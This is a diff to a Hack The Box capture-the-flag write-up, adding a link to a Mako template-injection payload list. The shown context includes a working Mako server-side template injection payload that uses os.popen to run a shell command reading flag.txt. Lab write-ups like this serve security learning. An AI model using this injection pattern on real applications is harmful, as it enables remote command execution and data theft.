@@ -15,7 +15,7 @@
 ![Screenshot_2023-06-22_03-37-47](https://github.com/0jamaKig86/Hack-The-Box.ojmk/assets/95555712/46bf37b6-8a67-4345-b0c2-85ee90e78218)
 
 
-6. We search `Mako template injection payload` and try some payload.
+6. We search `Mako template injection payload` and try [some payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako).
 7. Final payload!!!
 
 ` ${self.__init__.__globals__['util'].os.popen('cd / && cat flag.txt').read()} `
